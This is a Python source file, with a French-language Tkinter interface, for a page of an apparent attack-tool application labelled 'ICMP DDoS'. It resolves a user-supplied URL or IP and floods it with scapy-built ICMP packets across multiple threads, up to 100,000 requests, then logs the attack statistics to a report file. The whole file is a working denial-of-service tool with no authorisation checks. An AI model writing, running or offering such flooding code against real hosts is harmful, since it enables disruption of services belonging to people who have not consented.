from scapy.all import IP, ICMP, send
import socket
import tkinter as tk
from threading import Thread, Event
import time

class ICMPDdosPage(tk.Frame):
    def __init__(self, parent, controller, global_url, show_button):
        super().__init__(parent)
        self.controller = controller
        self.global_url = global_url
        self.show_button = show_button
        self.stop_event = Event()
        self.attack_start_time = None
        self.attack_end_time = None 
        self.completed_requests = 0 
        self.results_displayed = False  
        
        labelAttack = tk.Label(self, text="Page ICMP DDoS", font=("Arial", 16))
        labelAttack.pack(pady=20)
        
        tk.Label(self, text="URL cible ou Adresse IP cible :").pack(pady=5)
        self.target_entry = tk.Entry(self, width=40)
        self.target_entry.pack(pady=10)
        self.target_entry.insert(0, self.global_url)
        tk.Label(self, text="Nombre de requêtes :").pack(pady=5)
        self.nbRequestsVar = tk.StringVar(value="100")
        nbRequestsDropdown = tk.OptionMenu(self, self.nbRequestsVar, "1", "5", "10", "20", "30", "50", "100", "200", "500", "1000", "2500", "5000", "7500","100000")
        nbRequestsDropdown.pack(pady=5)
        
        tk.Label(self, text="Intervalle entre requêtes (secondes) :").pack(pady=5)
        self.requestsInterval = tk.Entry(self, width=10)
        self.requestsInterval.insert(0, "0.1")  # Intervalle par défaut
        self.requestsInterval.pack(pady=5)
        
        tk.Label(self, text="Nombre de threads :").pack(pady=5)
        self.threadsEntry = tk.Entry(self, width=10)
        self.threadsEntry.insert(0, "1")  # Nb threads par défaut
        self.threadsEntry.pack(pady=5)
        
        if self.show_button:
            self.start_button = tk.Button(self, text="Lancer l'attaque DDoS", command=self.start_attack)
            self.start_button.pack(pady=10)
        
        if self.show_button:
            self.stop_button = tk.Button(self, text="Stopper l'attaque", command=self.stop_attack, state="disabled")
            self.stop_button.pack(pady=10)
        
        self.status_label = tk.Label(self, text="")
        self.status_label.pack(pady=10)

        self.results_text = tk.Text(self, height=10, width=50, state=tk.DISABLED)
        self.results_text.pack(pady=10)
    
    def start_attack(self):
        target = self.target_entry.get()
        if not target:
            self.status_label.config(text="Erreur : veuillez entrer une URL ou une adresse IP valide.")
            return

        try:
            from urllib.parse import urlparse
            parsed_url = urlparse(target)
            hostname = parsed_url.netloc or parsed_url.path
            target_ip = socket.gethostbyname(hostname)
        except Exception as e:
            self.status_label.config(text=f"Erreur : Impossible de résoudre l'URL ou l'adresse IP n'est pas valide. {str(e)}")
            return

        self.numRequests = int(self.nbRequestsVar.get())
        self.interval = float(self.requestsInterval.get())
        num_threads = int(self.threadsEntry.get())

        if target_ip:
            self.attack_start_time = time.time()
            self.stop_event.clear()
            self.completed_requests = 0
            self.results_displayed = False
            self.status_label.config(text="Lancement en cours...")
            if self.show_button:
                self.stop_button.config(state="normal")
                self.start_button.config(state="disabled")

            for _ in range(num_threads):
                Thread(target=self.attack_thread, args=(target_ip,)).start()

            # Thread pour mettre à jour le statut
            Thread(target=self.update_status).start()

    def attack_thread(self, target_ip):
        while not self.stop_event.is_set() and self.completed_requests < self.numRequests:
            try:
                icmp_packet = IP(dst=target_ip)/ICMP()
                send(icmp_packet, verbose=False)
                self.completed_requests += 1
                time.sleep(self.interval)
            except Exception as e:
                print(f"Erreur lors de l'envoi du paquet : {e}")

    def update_status(self):
        while not self.stop_event.is_set() and self.completed_requests < self.numRequests:
            self.status_label.config(text=f"Requêtes envoyées : {self.completed_requests}/{self.numRequests}")
            self.update()
            time.sleep(0.1)
        
        if not self.stop_event.is_set():
            self.stop_attack()

    def stop_attack(self):
        self.stop_event.set()
        self.attack_end_time = time.time()
        self.status_label.config(text="Attaque terminée")
        if self.show_button:
            self.stop_button.config(state="disabled")
            self.start_button.config(state="normal")
        self.show_results()

    def show_results(self):
        if not self.results_displayed:
            self.results_displayed = True
            duration = self.attack_end_time - self.attack_start_time
            results = (
                f"Durée totale : {duration:.2f} secondes\n"
                f"Nombre total de requêtes : {self.completed_requests}\n"
                f"Requêtes par seconde : {self.completed_requests/duration:.2f}\n"
            )

            self.results_text.config(state=tk.NORMAL)
            self.results_text.delete(1.0, tk.END)
            self.results_text.insert(tk.END, results)
            self.results_text.config(state=tk.DISABLED)

            with open("report.md", "a", encoding="utf-8") as file:
                file.write(f"## Analyse de l'attaque ICMP DDoS\n")
                file.write(f"Durée totale : {duration:.2f} secondes\n")
                file.write(f"Nombre total de requêtes : {self.completed_requests}\n")
                file.write(f"Requêtes par seconde : {self.completed_requests/duration:.2f}\n")
                file.write("\n\n")
